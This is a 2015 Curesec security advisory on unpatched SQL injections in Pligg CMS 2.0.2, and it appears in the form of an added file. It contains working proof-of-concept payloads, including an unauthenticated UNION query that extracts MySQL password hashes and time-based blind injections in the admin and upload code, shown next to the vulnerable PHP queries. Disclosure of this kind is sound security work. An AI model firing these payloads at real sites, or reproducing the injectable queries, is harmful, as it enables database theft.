@@ -1,0 +1,149 @@
+Security Advisory - Curesec Research Team
+
+1. Introduction
+
+Affected Product:    Pligg CMS 2.0.2
+Fixed in:            not fixed
+Fixed Version Link:  n/a
+Vendor Website:      http://pligg.com/
+Vulnerability Type:  SQL Injection
+Remote Exploitable:  Yes
+Reported to vendor:  09/01/2015
+Disclosed to public: 10/07/2015
+Release mode:        Full Disclosure
+CVE:                 n/a
+Credits              Tim Coen of Curesec GmbH
+
+2. Overview
+
+There are multiple SQL Injection vulnerabilities in Pligg CMS 2.0.2. One of
+them does not require any credentials, and allows the direct extraction of data
+from the database.
+
+3. SQL Injection
+
+Description
+
+Pligg CMS is vulnerable to SQL injection. It is possible to extract data from
+all databases that the pligg database user has access to.
+
+Credentials are not required.
+
+Proof Of Concept
+
+
+http://localhost//pligg-cms-master/story.php?title=google-blabla&reply=1&comment_id=1%20union%20all%20select%201,1,1,1,1,1,1,password,password,1%20from%20mysql.user%20%23
+
+Code
+
+
+/story.php:168
+if(isset($_GET['reply']) && !empty($parent_comment_id)){
+        $main_smarty->assign('the_comments', get_comments(true,0,$_GET['comment_id']));
+        $main_smarty->assign('parrent_comment_id',$parent_comment_id);
+}
+[...]
+function get_comments ($fetch = false, $parent = 0, $comment_id=0, $show_parent=0){
+        Global $db, $main_smarty, $current_user, $CommentOrder, $link, $cached_comments;
+
+        //Set comment order to 1 if it's not set in the admin panel
+        if (isset($_GET['comment_sort'])) setcookie('CommentOrder', $CommentOrder = $_GET['comment_sort'], time()+60*60*24*180);
+        elseif (isset($_COOKIE['CommentOrder'])) $CommentOrder = $_COOKIE['CommentOrder'];
+
+        if (!isset($CommentOrder)) $CommentOrder = 1;
+        If ($CommentOrder == 1){$CommentOrderBy = "comment_votes DESC, comment_date DESC";}
+        If ($CommentOrder == 2){$CommentOrderBy = "comment_date DESC";}
+        If ($CommentOrder == 3){$CommentOrderBy = "comment_votes ASC, comment_date DESC";}
+        If ($CommentOrder == 4){$CommentOrderBy = "comment_date ASC";}
+
+[...]
+
+        $comments = $db->get_results("SELECT *
+        FROM " . table_comments . "
+        WHERE (comment_status='published' $status_sql) AND
+               comment_link_id=$link->id AND comment_id = $comment_id
+        ORDER BY " . $CommentOrderBy);
+
+4. Blind SQL Injection (Admin Area)
+
+Description
+
+There is a blind SQL Injection in the admin area of Pligg CMS. This allows an
+attacker that gained admin credentials to extract data from the database.
+
+The problem exists because the index of the submitted "enabled" POST array is
+used in a query. The value is escaped - so using quotes in the injection is not
+possible - but it does not place the value in between quotes.
+
+Proof Of Concept
+
+
+POST /pligg-cms-master/admin/admin_users.php HTTP/1.1
+
+frmsubmit=userlist&admin_acction=2&token=VALID_CSRF_TOKEN&all1=on&enabled[2 AND IF(SUBSTRING(version(), 1, 1)%3D5,BENCHMARK(500000000,version()),null) %23]=1
+
+Code
+
+
+// admin/admin_users.php
+foreach($_POST["enabled"] as $id => $valuea)
+{
+        $_GET['id'] = $id = $db->escape($id);
+        $user= $db->get_row('SELECT * FROM ' . table_users ." where user_id=$id");
+
+5. Possibly SQL Injection
+
+Description
+
+The upload module is vulnerable to Blind SQL Injection via the "comment" as
+well as "id" parameter.
+
+The module seems to be unused at the moment, but if it were to be used in the
+future, or if an attacker finds a different way to execute it, it would be
+vulnerable.
+
+The requests to trigger the vulnerabilities would be:
+
+POST http://localhost/pligg-cms-master/modules/upload/upload.php
+id=1&number=1&comment=1' AND IF(SUBSTRING(version(), 1, 1)%3D5,BENCHMARK(500000000,version()),null) %23
+
+POST http://localhost/pligg-cms-master/modules/upload/upload.php
+id=1<script' or 1%3D1%23></script>&number=1&comment=1
+
+Code
+
+
+./modules/upload/upload.php:
+if ($_POST['id'])
+{
+        $linkres=new Link;
+        $linkres->id = sanitize($_POST['id'], 3);
+        if(!is_numeric($linkres->id)) die("Wrong ID");
+        if(!is_numeric($_POST['number']) || $_POST['number']<=0) die("Wrong number");
+        if($_POST['number'] > get_misc_data('upload_maxnumber')) die("Too many files");
+
+        // Remove old file and thumbnails with same number
+        $sql = "SELECT * FROM ".table_prefix."files WHERE ".($isadmin ? "" : "file_user_id='{$current_user->user_id}' AND")." file_link_id='{$_POST['id']}' AND file_number='{$_POST['number']}' AND file_comment_id='$_POST[comment]'";
+
+The first problem is that $_POST[comment] is never sanitized.
+
+The second problem is that $_POST['id'] is first sanitized by removing tags,
+then it is checked if that result is nummeric, and finally the original POST
+value is used. Because of this, it is possible to put the injection inside tags
+to bypass the check.
+
+6. Solution
+
+This issue was not fixed by the vendor.
+
+7. Report Timeline
+
+09/01/2015 Informed Vendor about Issue (no reply)
+09/22/2015 Reminded Vendor of disclosure date
+09/22/2015 Vendor replied, issue has been send to staff
+09/29/2015 Reminded Vendor of disclosure date (no reply)
+10/07/2015 Disclosed to public
+
+
+Blog Reference:
+http://blog.curesec.com/article/blog/Pligg-CMS-202-Multiple-SQL-Injections-82.html
